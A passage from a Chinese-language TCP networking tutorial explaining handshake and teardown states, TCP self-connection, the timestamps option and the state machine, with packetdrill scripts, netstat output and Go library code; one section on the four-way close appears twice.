以后端口允许重用，收到一个包以后不知道新连接的还是旧连接的包因为网络的原因姗姗来迟，造成数据的混淆。如果采用动态增长的 ISN，那么可以保证两个连接的 ISN 不会相同，不会串包。\n三次握手的状态变化 三次握手过程的状态变化图如下 对于客户端而言：\n 初始的状态是处于 CLOSED 状态。CLOSED 并不是一个真实的状态，而是一个假想的起点和终点。 客户端调用 connect 以后会发送 SYN 同步报文给服务端，然后进入 SYN-SENT 阶段，客户端将保持这个阶段直到它收到了服务端的确认包。 如果在 SYN-SENT 状态收到了服务端的确认包，它将发送确认服务端 SYN 报文的 ACK 包，同时进入 ESTABLISHED 状态，表明自己已经准备好发送数据。  对于服务端而言：\n 初始状态同样是 CLOSED 状态 在执行 bind、listen 调用以后进入 LISTEN 状态，等待客户端连接。 当收到客户端的 SYN 同步报文以后，会回复确认同时发送自己的 SYN 同步报文，这时服务端进入 SYN-RCVD 阶段等待客户端的确认。 当收到客户端的确认报文以后，进入ESTABLISHED 状态。这时双方可以互相发数据了。  如何构造一个 SYN_SENT 状态的连接 使用我们前面介绍的 packetdrill 可以轻松构造一个 SYN_SENT 状态的连接（发出 SYN 包对端没有回复的状况）\n1 2 3 4 5  // 新建一个 server socket +0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3  // 客户端 connect +0 connect(3, ..., ...) = -1   执行 netstat 命令可以看到\n1 2  netstat -atnp | grep -i 8080 tcp 0 1 192.168.46.26:42678 192.0.2.1:8080 SYN_SENT 3897/packetdrill   执行 tcpdump 抓包sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap，使用 wireshark 可以看到没有收到对端 ACK 的情况下，SYN 包重传了 6 次，这个值是由/proc/sys/net/ipv4/tcp_syn_retries决定的， 在我的 Centos 机器上，这个值等于 6\n1 2  cat /proc/sys/net/ipv4/tcp_syn_retries 6   6次重试（63s = 1s+2s+4s+8s+16s+32s)以后放弃重试，connect 调用返回 -1，调用超时，如果是用 Java 等语言就会返回java.net.ConnectException: Connection timed out异常\n同时打开 TCP 支持同时打开，但是非常罕见，使用场景也比较有限，不过我们还是简单介绍一下。它们的包交互过程是怎么样的？TCP 状态变化又是怎么样的呢？\n包交互的过程如下图\n以其中一方为例，记为 A，另外一方记为 B\n 最初的状态是CLOSED A 发起主动打开，发送 SYN 给 B，然后进入SYN-SENT状态 A 还在等待 B 回复的 ACK 的过程中，收到了 B 发过来的 SYN，what are you 弄啥咧，A 没有办法，只能硬着头皮回复SYN+ACK，随后进入SYN-RCVD A 依旧死等 B 的 ACK 好不容易等到了 B 的 ACK，对于 A 来说连接建立成功  同时打开在通信两端时延比较大情况下比较容易模拟，我还没有在本地模拟成功。\n小结 这篇文章主要介绍了三次握手的相关的内容，我们来回顾一下。\n首先介绍了三次握手交换 ISN 的细节：\n SYN 段长度为 0 却需要消耗一个序列号，原因是 SYN 段需要对端确认 ACK 段长度为 0，不消耗序列号，也不用对端确认 ISN 不能从一个固定的值开始，原因是处于安全性和避免前后连接互相干扰  接下来首次介绍了 TCP 的状态机，TCP 的这 11 中状态的变化是 TCP 学习的重中之重。\n接下来用 packetdrill 轻松构造了一个 SYN_SENT 状态的 TCP 连接，随后通过这个例子介绍了这本小册第一个 TCP 定时器「连接建立定时器」，这个定时器会在发送第一个 SYN 包以后开启，如果没有收到对端 ACK，会重传指定的次数。\n最后我们介绍了同时打开这种比较罕见的建立连接的方式。\n作业题 1、TCP 协议三次握手建立一个连接，第二次握手的时候服务器所处的状态是（）\n A、SYN_RECV B、ESTABLISHED C、SYN-SENT D、LAST_ACK  2、下面关于三次握手与connect()函数的关系说法错误的是（）\n A、客户端发送 SYN 给服务器 B、服务器只发送 SYN 给客户端 C、客户端收到服务器回应后发送 ACK 给服务器 D、connect() 函数在三次握手的第二次返回  欢迎你在留言区留言，和我一起讨论。\n10、聊聊 TCP 自连接那些事 TCP 的自连接是一个比较有意思的现象，甚至很多人认为是 Linux 内核的 bug。我们先来看看 TCP 的自连接是什么。\nTCP 自连接是什么 新建一个脚本 self_connect.sh，内容如下：\n1 2 3 4  while true do \ttelnet 127.0.0.1 50000 done   执行这段脚本之前先用 netstat 等命令确认 50000 没有进程监听。然后执行脚本，经过一段时间，telnet 居然成功了。\n1 2 3 4 5 6 7  Trying 127.0.0.1... telnet: connect to address 127.0.0.1: Connection refused Trying 127.0.0.1... telnet: connect to address 127.0.0.1: Connection refused Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is \u0026#39;^]\u0026#39;.   使用 netstat 查看当前的 50000 端口的连接状况，如下所示。\n1 2  Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:50000 127.0.0.1:50000 ESTABLISHED 24786/telnet   可以看到源 IP、源端口是 127.0.0.1:50000，目标 ip、目标端口也是 127.0.0.1:50000，通过上面的脚本，我们连上了本来没有监听的端口号。\n自连接原因分析 自连接成功的抓包结果如下图所示。\n对于自连接而言，上图中 wireshark 中的每个包的发送接收双方都是自己，所以可以理解为总共是六个包，包的交互过程如下图所示。\n这个图是不是似曾相识？前四个包的交互过程就是 TCP 同时打开的过程。\n当一方主动发起连接时，操作系统会自动分配一个临时端口号给连接主动发起方。如果刚好分配的临时端口是 50000 端口，过程如下。\n 第一个包是发送 SYN 包给 50000 端口 对于发送方而已，它收到了这个 SYN 包，以为对方是想同时打开，会回复 SYN+ACK 回复 SYN+ACK 以后，它自己就会收到这个 SYN+ACK，以为是对方回的，对它而已握手成功，进入 ESTABLISHED 状态  自连接的危害 设想一个如下的场景：\n 你写的业务系统 B 会访问本机服务 A，服务 A 监听了 50000 端口 业务系统 B 的代码写的稍微比较健壮，增加了对服务 A 断开重连的逻辑 如果有一天服务 A 挂掉比较长时间没有启动，业务系统 B 开始不断 connect 重连 系统 B 经过一段时间的重试就会出现自连接的情况 这时服务 A 想启动监听 50000 端口就会出现地址被占用的异常，无法正常启动  如果出现了自连接，至少有两个显而易见的问题：\n 自连接的进程占用了端口，导致真正需要监听端口的服务进程无法监听成功 自连接的进程看起来 connect 成功，实际上服务是不正常的，无法正常进行数据通信  如何解决自连接问题 自连接比较罕见，但一旦出现逻辑上就有问题了，因此要尽量避免。解决自连接有两个常见的办法。\n 让服务监听的端口与客户端随机分配的端口不可能相同即可 出现自连接的时候，主动关掉连接  对于第一种方法，客户端随机分配的范围由 /proc/sys/net/ipv4/ip_local_port_range 文件决定，在我的 Centos 8 上，这个值的范围是 32768~60999，只要服务监听的端口小于 32768 就不会出现客户端与服务端口相同的情况。这种方式比较推荐。\n对于第二种方法，我第一次见是在 Golang 的 TCP connect 的代码，代码如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  func (sd *sysDialer) doDialTCP(ctx context.Context, laddr, raddr *TCPAddr) (*TCPConn, error) { \tfd, err := internetSocket(ctx, sd.network, laddr, raddr, syscall.SOCK_STREAM, 0, \u0026#34;dial\u0026#34;, sd.Dialer.Control)  \t// TCP has a rarely used mechanism called a \u0026#39;simultaneous connection\u0026#39; in \t// which Dial(\u0026#34;tcp\u0026#34;, addr1, addr2) run on the machine at addr1 can \t// connect to a simultaneous Dial(\u0026#34;tcp\u0026#34;, addr2, addr1) run on the machine \t// at addr2, without either machine executing Listen. If laddr == nil, \t// it means we want the kernel to pick an appropriate originating local \t// address. Some Linux kernels cycle blindly through a fixed range of \t// local ports, regardless of destination port. If a kernel happens to \t// pick local port 50001 as the source for a Dial(\u0026#34;tcp\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;localhost:50001\u0026#34;), \t// then the Dial will succeed, having simultaneously connected to itself. \t// This can only happen when we are letting the kernel pick a port (laddr == nil) \t// and when there is no listener for the destination address. \t// It\u0026#39;s hard to argue this is anything other than a kernel bug. If we \t// see this happen, rather than expose the buggy effect to users, we \t// close the fd and try again. If it happens twice more, we relent and \t// use the result. See also: \t//\thttps://golang.org/issue/2690 \t//\thttps://stackoverflow.com/questions/4949858/ \t// \t// The opposite can also happen: if we ask the kernel to pick an appropriate \t// originating local address, sometimes it picks one that is already in use. \t// So if the error is EADDRNOTAVAIL, we have to try again too, just for \t// a different reason. \t// \t// The kernel socket code is no doubt enjoying watching us squirm. \tfor i := 0; i \u0026lt; 2 \u0026amp;\u0026amp; (laddr == nil || laddr.Port == 0) \u0026amp;\u0026amp; (selfConnect(fd, err) || spuriousENOTAVAIL(err)); i++ { \tif err == nil { \tfd.Close() \t} \tfd, err = internetSocket(ctx, sd.network, laddr, raddr, syscall.SOCK_STREAM, 0, \u0026#34;dial\u0026#34;, sd.Dialer.Control) \t}  \tif err != nil { \treturn nil, err \t} \treturn newTCPConn(fd), nil }  func selfConnect(fd *netFD, err error) bool { \t// If the connect failed, we clearly didn\u0026#39;t connect to ourselves. \tif err != nil { \treturn false \t}  \t// The socket constructor can return an fd with raddr nil under certain \t// unknown conditions. The errors in the calls there to Getpeername \t// are discarded, but we can\u0026#39;t catch the problem there because those \t// calls are sometimes legally erroneous with a \u0026#34;socket not connected\u0026#34;. \t// Since this code (selfConnect) is already trying to work around \t// a problem, we make sure if this happens we recognize trouble and \t// ask the DialTCP routine to try again. \t// TODO: try to understand what\u0026#39;s really going on. \tif fd.laddr == nil || fd.raddr == nil { \treturn true \t} \tl := fd.laddr.(*TCPAddr) \tr := fd.raddr.(*TCPAddr) \treturn l.Port == r.Port \u0026amp;\u0026amp; l.IP.Equal(r.IP) }   这里详细解释了为什么有 selfConnect 方法的判断，判断是否是自连接的逻辑是判断源 IP 和目标 IP 是否相等，源端口号和目标端口号是否相等。\n小结 到这里，TCP 自连接的知识就介绍完了，在以后写 web 服务监听端口时，记得看下机器上的端口范围，不要胡来。\n在面试的过程中，经常会被问到：“你可以讲讲三次握手、四次挥手吗？”，大部分面试者都会熟练的背诵，每个阶段做什么，这篇文章我们将深入讲解连接终止相关的细节问题。\n四次挥手 最常见的四次挥手的过程下图所示\n1、客户端调用 close 方法，执行「主动关闭」，会发送一个 FIN 报文给服务端，从这以后客户端不能再发送数据给服务端了，客户端进入FIN-WAIT-1状态。FIN 报文其实就是将 FIN 标志位设置为 1。 FIN 段是可以携带数据的，比如客户端可以在它最后要发送的数据块可以“捎带” FIN 段。当然也可以不携带数据。不管 FIN 段是否携带数据，都需要消耗一个序列号。\n客户端发送 FIN 包以后不能再发送数据给服务端，但是还可以接受服务端发送的数据。这个状态就是所谓的「半关闭（half-close）」\n主动发起关闭的一方称为「主动关闭方」，另外一方称为「被动关闭方」。\n2、服务端收到 FIN 包以后回复确认 ACK 报文给客户端，服务端进入 CLOSE_WAIT，客户端收到 ACK 以后进入FIN-WAIT-2状态。\n3、服务端也没有数据要发送了，发送 FIN 报文给客户端，然后进入LAST-ACK 状态，等待客户端的 ACK。同前面一样如果 FIN 段没有携带数据，也需要消耗一个序列号。\n4、客户端收到服务端的 FIN 报文以后，回复 ACK 报文用来确认第三步里的 FIN 报文，进入TIME_WAIT状态，等待 2 个 MSL 以后进入 CLOSED状态。服务端收到 ACK 以后进入CLOSED状态。TIME_WAIT是一个很神奇的状态，后面有文章会专门介绍。\n为什么 FIN 报文要消耗一个序列号 如三次握手的 SYN 报文一样，不管是否携带数据，FIN 段都需要消耗一个序列号。我们用一个图来解释，如果 FIN 段不消耗一个序列号会发生什么。\n如上图所示，如果 FIN 包不消耗一个序列号。客户端发送了 100 字节的数据包和 FIN 包，都等待服务端确认。如果这个时候客户端收到了ACK=1000 的确认包，就无法得知到底是 100 字节的确认包还是 FIN 包的确认包。\n为什么挥手要四次，变为三次可以吗？ 首先我们先明确一个问题，TCP 连接终止一定要四次包交互吗？三次可以吗？\n当然可以，因为有延迟确认的存在，把第二步的 ACK 经常会跟随第三步的 FIN 包一起捎带会对端。延迟确认后面有一节专门介绍。\n一个真实的 wireshark 抓包如下图所示\n其实这个行为跟应用层有比较大的关系，因为发送 FIN 包以后，会进入半关闭（half-close）状态，表示自己不会再给对方发送数据了。因此如果服务端收到客户端发送的 FIN 包以后，只能表示客户端不会再给自己发送数据了，但是服务端这个时候是可以给客户端发送数据的。\n在这种情况下，如果不及时发送 ACK 包，死等服务端这边发送数据，可能会造成客户端不必要的重发 FIN 包，如下图所示。\n如果服务端确定没有什么数据需要发给客户端，那么当然是可以把 FIN 和 ACK 合并成一个包，四次挥手的过程就成了三次。\n握手可以变为四次吗？ 其实理论上完全是可以的，把三次握手的第二次的 SYN+ACK 拆成先回 ACK 包，再发 SYN 包就变成了「四次握手」\n与 FIN 包不同的是，一般情况下，SYN 包都不携带数据，收到客户端的 SYN 包以后不用等待，可以立马回复 SYN+ACK，四次握手理论上可行，但是现实中我还没有见过。\n同时关闭 前面介绍的都是一端收到了对端的 FIN，然后回复 ACK，随后发送自己的 FIN，等待对端的 ACK。TCP 是全双工的，当然可以两端同时发起 FIN 包。如下图所示\n以客户端为例\n 最初客户端和服务端都处于 ESTABLISHED 状态 客户端发送 FIN 包，等待对端对这个 FIN 包的 ACK，随后进入 FIN-WAIT-1 状态 处于FIN-WAIT-1状态的客户端还没有等到 ACK，收到了服务端发过来的 FIN 包 收到 FIN 包以后客户端会发送对这个 FIN 包的的确认 ACK 包，同时自己进入 CLOSING 状态 继续等自己 FIN 包的 ACK 处于 CLOSING 状态的客户端终于等到了ACK，随后进入TIME-WAIT 在TIME-WAIT状态持续 2*MSL，进入CLOSED状态  我用 packetdrill 脚本模拟了一下同时关闭，部分代码如下，完整的代码见：simultaneous-close.pkt\n1 2 3 4 5 6 7 8 9 10 11 12  // 服务端发送 FIN 0.150 close(4) = 0 0.150 \u0026gt; F. 1:1(0) ack 1 \u0026lt;...\u0026gt;  // 客户端发送 FIN 0.150 \u0026lt; F. 1:1(0) ack 2 win 65535  // 服务端回复 ACK 0.150 \u0026gt; . 2:2(0) ack 2 \u0026lt;...\u0026gt;  // 客户端回复 ACK 0.150 \u0026lt; . 2:2(0) ack 2 win 65535   使用 wireshark 抓包如下图所示，完整的抓包文件可以在这里下载：simultaneous-close.pcap\n上面的脚本并不能每次模拟出两端都进入TIME_WAIT的状态，取决于在发送 FIN包之前有没有提前收到对端的 FIN 包。如果在发送 FIN 之前收到了对端的 FIN，只会有一段进入TIME_WAIT\n小结 这篇文章介绍了四次挥手断开连接的细节，然后用图解的方式介绍了为什么 FIN 包需要占用一个序列号。随后引出了为什么挥手要四次的问题，最后通过 packetdrill 的方式模拟了同时关闭。\n面试题 1、HTTP传输完成，断开进行四次挥手，第二次挥手的时候客户端所处的状态是：\n A、CLOSE_WAIT B、LAST_ACK C、FIN_WAIT2 D、TIME_WAIT  2、正常的 TCP 三次握手和四次挥手过程（客户端建连、断连）中，以下状态分别处于服务端和客户端描述正确的是\n A、服务端：SYN-SEND，TIME-WAIT 客户端：SYN-RCVD，CLOSE-WAIT B、服务端：SYN-SEND，CLOSE-WAIT 客户端：SYN-RCVD，TIME-WAIT C、服务端：SYN-RCVD，CLOSE-WAIT 客户端：SYN-SEND，TIME-WAIT D、服务端：SYN-RCVD，TIME-WAIT 客户端：SYN-SEND，CLOSE-WAIT  11、相见时难别亦难 —— 谈谈四次挥手 在面试的过程中，经常会被问到：“你可以讲讲三次握手、四次挥手吗？”，大部分面试者都会熟练的背诵，每个阶段做什么，这篇文章我们将深入讲解连接终止相关的细节问题。\n四次挥手 最常见的四次挥手的过程下图所示\n1、客户端调用 close 方法，执行「主动关闭」，会发送一个 FIN 报文给服务端，从这以后客户端不能再发送数据给服务端了，客户端进入FIN-WAIT-1状态。FIN 报文其实就是将 FIN 标志位设置为 1。 FIN 段是可以携带数据的，比如客户端可以在它最后要发送的数据块可以“捎带” FIN 段。当然也可以不携带数据。不管 FIN 段是否携带数据，都需要消耗一个序列号。\n客户端发送 FIN 包以后不能再发送数据给服务端，但是还可以接受服务端发送的数据。这个状态就是所谓的「半关闭（half-close）」\n主动发起关闭的一方称为「主动关闭方」，另外一方称为「被动关闭方」。\n2、服务端收到 FIN 包以后回复确认 ACK 报文给客户端，服务端进入 CLOSE_WAIT，客户端收到 ACK 以后进入FIN-WAIT-2状态。\n3、服务端也没有数据要发送了，发送 FIN 报文给客户端，然后进入LAST-ACK 状态，等待客户端的 ACK。同前面一样如果 FIN 段没有携带数据，也需要消耗一个序列号。\n4、客户端收到服务端的 FIN 报文以后，回复 ACK 报文用来确认第三步里的 FIN 报文，进入TIME_WAIT状态，等待 2 个 MSL 以后进入 CLOSED状态。服务端收到 ACK 以后进入CLOSED状态。TIME_WAIT是一个很神奇的状态，后面有文章会专门介绍。\n为什么 FIN 报文要消耗一个序列号 如三次握手的 SYN 报文一样，不管是否携带数据，FIN 段都需要消耗一个序列号。我们用一个图来解释，如果 FIN 段不消耗一个序列号会发生什么。\n如上图所示，如果 FIN 包不消耗一个序列号。客户端发送了 100 字节的数据包和 FIN 包，都等待服务端确认。如果这个时候客户端收到了ACK=1000 的确认包，就无法得知到底是 100 字节的确认包还是 FIN 包的确认包。\n为什么挥手要四次，变为三次可以吗？ 首先我们先明确一个问题，TCP 连接终止一定要四次包交互吗？三次可以吗？\n当然可以，因为有延迟确认的存在，把第二步的 ACK 经常会跟随第三步的 FIN 包一起捎带会对端。延迟确认后面有一节专门介绍。\n一个真实的 wireshark 抓包如下图所示\n其实这个行为跟应用层有比较大的关系，因为发送 FIN 包以后，会进入半关闭（half-close）状态，表示自己不会再给对方发送数据了。因此如果服务端收到客户端发送的 FIN 包以后，只能表示客户端不会再给自己发送数据了，但是服务端这个时候是可以给客户端发送数据的。\n在这种情况下，如果不及时发送 ACK 包，死等服务端这边发送数据，可能会造成客户端不必要的重发 FIN 包，如下图所示。\n如果服务端确定没有什么数据需要发给客户端，那么当然是可以把 FIN 和 ACK 合并成一个包，四次挥手的过程就成了三次。\n握手可以变为四次吗？ 其实理论上完全是可以的，把三次握手的第二次的 SYN+ACK 拆成先回 ACK 包，再发 SYN 包就变成了「四次握手」\n与 FIN 包不同的是，一般情况下，SYN 包都不携带数据，收到客户端的 SYN 包以后不用等待，可以立马回复 SYN+ACK，四次握手理论上可行，但是现实中我还没有见过。\n同时关闭 前面介绍的都是一端收到了对端的 FIN，然后回复 ACK，随后发送自己的 FIN，等待对端的 ACK。TCP 是全双工的，当然可以两端同时发起 FIN 包。如下图所示\n以客户端为例\n 最初客户端和服务端都处于 ESTABLISHED 状态 客户端发送 FIN 包，等待对端对这个 FIN 包的 ACK，随后进入 FIN-WAIT-1 状态 处于FIN-WAIT-1状态的客户端还没有等到 ACK，收到了服务端发过来的 FIN 包 收到 FIN 包以后客户端会发送对这个 FIN 包的的确认 ACK 包，同时自己进入 CLOSING 状态 继续等自己 FIN 包的 ACK 处于 CLOSING 状态的客户端终于等到了ACK，随后进入TIME-WAIT 在TIME-WAIT状态持续 2*MSL，进入CLOSED状态  我用 packetdrill 脚本模拟了一下同时关闭，部分代码如下，完整的代码见：simultaneous-close.pkt\n1 2 3 4 5 6 7 8 9 10 11 12  // 服务端发送 FIN 0.150 close(4) = 0 0.150 \u0026gt; F. 1:1(0) ack 1 \u0026lt;...\u0026gt;  // 客户端发送 FIN 0.150 \u0026lt; F. 1:1(0) ack 2 win 65535  // 服务端回复 ACK 0.150 \u0026gt; . 2:2(0) ack 2 \u0026lt;...\u0026gt;  // 客户端回复 ACK 0.150 \u0026lt; . 2:2(0) ack 2 win 65535   使用 wireshark 抓包如下图所示，完整的抓包文件可以在这里下载：simultaneous-close.pcap\n上面的脚本并不能每次模拟出两端都进入TIME_WAIT的状态，取决于在发送 FIN包之前有没有提前收到对端的 FIN 包。如果在发送 FIN 之前收到了对端的 FIN，只会有一段进入TIME_WAIT\n小结 这篇文章介绍了四次挥手断开连接的细节，然后用图解的方式介绍了为什么 FIN 包需要占用一个序列号。随后引出了为什么挥手要四次的问题，最后通过 packetdrill 的方式模拟了同时关闭。\n面试题 1、HTTP传输完成，断开进行四次挥手，第二次挥手的时候客户端所处的状态是：\n A、CLOSE_WAIT B、LAST_ACK C、FIN_WAIT2 D、TIME_WAIT  2、正常的 TCP 三次握手和四次挥手过程（客户端建连、断连）中，以下状态分别处于服务端和客户端描述正确的是\n A、服务端：SYN-SEND，TIME-WAIT 客户端：SYN-RCVD，CLOSE-WAIT B、服务端：SYN-SEND，CLOSE-WAIT 客户端：SYN-RCVD，TIME-WAIT C、服务端：SYN-RCVD，CLOSE-WAIT 客户端：SYN-SEND，TIME-WAIT D、服务端：SYN-RCVD，TIME-WAIT 客户端：SYN-SEND，CLOSE-WAIT  12、时光机 —— TCP 头部时间戳选项 TCP 头部时间戳选项（TCP Timestamps Option，TSopt） Timestamps 选项是什么 除了我们之前介绍的 MSS、Window Scale 还有以一个非常重要的选项：时间戳（TCP Timestamps Option，TSopt）。这个选项在 TCP 头部的位置如下所示。\nTimestamps 选项最初是在 RFC 1323 中引入的，这个 RFC 的标题是 \u0026ldquo;TCP Extensions for High Performance\u0026rdquo;，在这个 RFC 中同时提出的还有 Window Scale、PAWS 等机制。\nTimestamps 选项的组成部分 在 Wireshark 抓包中，常常会看到 TSval 和 TSecr 两个选项，值得注意的是第二个选项 TSecr 不是 secrets 的意思，而是 \u0026ldquo;TS Echo Reply\u0026rdquo; 的缩写，TSval 和 TSecr 是 TCP 选项时间戳的一部分。\nTCP Timestamps Option 由四部分构成：类别（kind）、长度（Length）、发送方时间戳（TS value）、回显时间戳（TS Echo Reply）。时间戳选项类别（kind）的值等于 8，用来与其它类型的选项区分。长度（length）等于 10。两个时间戳相关的选项都是 4 字节。\n如下图所示：\n是否使用时间戳选项是在三次握手里面的 SYN 报文里面确定的。下面的包是curl github.com抓包得到的结果。\n 发送方发送数据时，将一个发送时间戳 1734581141 放在发送方时间戳TSval中 接收方收到数据包以后，将收到的时间戳 1734581141 原封不动的返回给发送方，放在TSecr字段中，同时把自己的时间戳 3303928779 放在TSval中 后面的包以此类推  Timestamps 选项的作用 Timestamps 选项的提出初衷是为了解决两个问题：\n1、两端往返时延测量（RTTM）\n2、序列号回绕（PAWS），接下来我们来进行介绍。\n测量 RTTM 发送端在收到接收方发出的 ACK 报文以后，就可以通过这个响应报文的 TSecr\n在启用 timestamp 选项之前，测量 RTT 的过程如下。\nTCP 在发送一个包时，会记录这个包的发送的时间 t1，用收到这个包的确认包时 t2 减去 t1 就可以得到这次的 RTT。这里有一个问题，如果发出的包出现重传，计算就变得复杂起来，如下所示。\n这里的 RTT 到底是 t3 - t1 还是 t3 - t2 呢？这两种方式无论选择哪一种都不太合适，无法得知收到的确认 ACK 是对第一次包还是重传包的的确认。TCP RFC6298 对这种行为的处理是不对重传包进行 RTT 计算，这样计算不会带来错误，但当所有包都出现重传的情况下，将没有包可用来计算 RTT。\n在启用 Timestamps 选项以后，因为 ACK 包里包含了 TSval 和 TSecr，这样无论是正常确认包，还是重传确认包，都可以通过这两个值计算出 RTT。\nPAWS Timestamps 选项带来的第二个作用是帮助判断 PAWS，TCP 的序列号用 32bit 来表示，因此在 2^32 字节的数据传输后序列号就会溢出回绕。TCP 的窗口经过窗口缩放可以最高到 1GB（2^30)，在高速网络中，序列号在很短的时间内就会被重复使用。\n下面以一个实际的例子来说明，如下图所示。\n假设发送了 6 个数据包，每个数据包的大小为 1GB，第 5 个包序列号发生回绕。第 2 个包因为某些原因延迟导致重传，但没有丢失到时间 t7 才到达。这个迷途数据包与后面要发送的第 6 个包序列号完全相同，如果没有一些措施进行区分，将会造成数据的紊乱。\n如果有 Timestamps 的存在，内核会维护一个为每个连接维护一个 ts_recent 值，记录最后一次通信的的 timestamps 值，在 t7 时间点收到迷途数据包 2 时，由于数据包 2 的 timestamps 值小于 ts_recent 值，就会丢弃掉这个数据包。等 t8 时间点真正的数据包 6 到达以后，由于数据包 6 的 timestamps 值大于 ts_recent，这个包可以被正常接收。\n补充说明 有几个需要说明的点\n timestamps 值是一个单调递增的值，与我们所知的 epoch 时间戳不是一回事，这个选项不要求两台主机进行时钟同步。两端 timestamps 值增加的间隔也可能步调不一致，比如一条主机以每 1ms 加一的方式递增，另外一条主机可以以每 1s 加一的方式递增。 与序列号一样，既然是递增 timestamps 值也是会溢出回绕的。 timestamps 是一个双向的选项，如果只要有一方不开启，双方都将停用 timestamps。比如下面是curl www.baidu.com得到的包。  可以看到客户端发起 SYN 包时带上了自己的 TSval，服务器回复的 SYN+ACK 包没有 TSval和TSecr，从此之后的包都没有带上时间戳选项了。\nTimestamps 选项造成的 RST 三次握手中的第二步，如果服务端回复 SYN+ACK 包中的 TSecr 不等于握手第一步客户端发送 SYN 包中的 TSval，客户端在对 SYN+ACK 回复 RST。示例包如下所示。\n待补充内容 随着 Timestamps 选项的引入，带来了一些安全性相关的问题，因为比较冷门，如果有读者感兴趣，可以留言，后面我再补充。\n13、状态机魔鬼 —— TCP 11 种状态变迁及模拟重现 讲完前面建立连接、断开连接的过程，整个 TCP 协议的 11 种状态都出现了。TCP 之所以复杂，是因为它是一个有状态的协议。如果这个时候祭出下面的 TCP 状态变化图，估计大多数人都会懵圈，不要慌，我们会把上面的状态一一解释清楚。\n上面这个图是网络上有人用 Latex 画出来了，很赞。不过有一处小错误，我修改了一下，如果感兴趣的话可以从我的 github 上进行下载，链接：tcp-state-machine.tex，在 overleaf 的网站可以进行实时预览。\n1、CLOSED 这个状态是一个「假想」的状态，是 TCP 连接还未开始建立连接或者连接已经彻底释放的状态。因此CLOSED状态也无法通过 netstat 或者 ss 等工具看到。\n从图中可以看到，从 CLOSE 状态转换为其它状态有两种可能：主动打开（Active Open）和被动打开（Passive Open）\n 被动打开：一般来说，服务端会监听一个特定的端口，等待客户端的新连接，同时会进入LISTEN状态，这种被称为「被动打开」 主动打开：客户端主动发送一个SYN包准备三次握手，被称为「主动打开（Active Open）」  2、LISTEN 一端（通常是服务端）调用 bind、listen 系统调用监听特定端口时进入到LISTEN状态，等待客户端发送 SYN 报文三次握手建立连接。\n在 Java 中只用一行代码就可以构造一个 listen 状态的 socket。\n1  ServerSocket serverSocket = new ServerSocket(9999);   ServerSocket 的构造器函数最终调用了 bind、listen，接下来就可以调用 accept 接收客户端连接请求了。\n使用 netstat 进行查看\n1 2  netstat -tnpa | grep -i 9999 tcp6 0 0 :::9999 :::* LISTEN 20096/java   处于LISTEN状态的连接收到SYN包以后会发送 SYN+ACK 给对端，同时进入SYN-RCVD阶段\n3、SYN-SENT 客户端发送 SYN 报文等待 ACK 的过程进入 SYN-SENT状态。同时会开启一个定时器，如果超时还没有收到ACK会重发 SYN。\n使用 packetdrill 可以非常快速的构造一个处于SYN-SENT状态的连接，完整的代码见：syn_sent.pkt\n1 2 3 4 5  // 新建一个 server socket +0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3  // 客户端 connect +0 connect(3, ..., ...) = -1   运行上面的脚本，然后使用 netstat 命令查看连接状态l\n1 2  netstat -atnp | grep -i 8080 tcp 0 1 192.168.46.26:42678 192.0.2.1:8080 SYN_SENT 3897/packetdrill   4、SYN-RCVD 服务端收到SYN报文以后会回复 SYN+ACK，然后等待对端 ACK 的时候进入SYN-RCVD，完整的代码见：state_syn_rcvd.pkt\n1 2 3 4  +0 \u0026lt; S 0:0(0) win 65535 \u0026lt;mss 100\u0026gt; +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt; // 故意注释掉下面这一行 // +.1 \u0026lt; . 1:1(0) ack 1 win 65535   5、ESTABLISHED SYN-SENT或者SYN-RCVD状态的连接收到对端确认ACK以后进入ESTABLISHED状态，连接建立成功。\n把上面例子中脚本的注释取消掉，三次握手成功就会进入ESTABLISHED状态。\n从图中可以看到ESTABLISHED状态的连接有两种可能的状态转换方式:\n 调用 close 等系统调用主动关闭连接，这个时候会发送 FIN 包给对端，同时自己进入FIN-WAIT-1状态 收到对端的 FIN 包，执行被动关闭，收到 FIN 包以后会回复 ACK，同时自己进入CLOSE-WAIT状态  6、FIN-WAIT-1 主动关闭的一方发送了 FIN 包，等待对端回复 ACK 时进入FIN-WAIT-1状态。\n模拟的 packetdrill 脚本见：state_fin_wait_1.pkt\n1 2 3 4 5 6 7 8  +0 \u0026lt; S 0:0(0) win 65535 \u0026lt;mss 100\u0026gt; +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt; .1 \u0026lt; . 1:1(0) ack 1 win 65535  +.1 accept(3, ..., ...) = 4  // 服务端主动断开连接 +.1 close(4) = 0   执行上的脚本，使用 netstat 就可以看到 FIN_WAIT1 状态的连接了\n1 2 3  netstat -tnpa | grep 8080 tcp 0 0 192.168.73.207:8080 0.0.0.0:* LISTEN - tcp 0 1 192.168.73.207:8080 192.0.2.1:52859 FIN_WAIT1 -   FIN_WAIT1状态的切换如下几种情况\n 当收到 ACK 以后，FIN-WAIT-1状态会转换到FIN-WAIT-2状态 当收到 FIN 以后，会回复对端 ACK，FIN-WAIT-1状态会转换到CLOSING状态 当收到 FIN+ACK 以后，会回复对端 ACK，FIN-WAIT-1状态会转换到TIME_WAIT状态，跳过了FIN-WAIT-2状态  7、FIN-WAIT-2 处于 FIN-WAIT-1状态的连接收到 ACK 确认包以后进入FIN-WAIT-2状态，这个时候主动关闭方的 FIN 包已经被对方确认，等待被动关闭方发送 FIN 包。\n模拟的脚本见：state_fin_wait_2.pkt，核心代码如下\n1 2 3 4 5 6 7 8 9 10  +0 \u0026lt; S 0:0(0) win 65535 \u0026lt;mss 100\u0026gt; +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt; .1 \u0026lt; . 1:1(0) ack 1 win 65535 +.1 accept(3, ..., ...) = 4  // 服务端主动断开连接 +.1 close(4) = 0  // 向协议栈注入 ACK 包，模拟客户端发送了 ACK +.1 \u0026lt; . 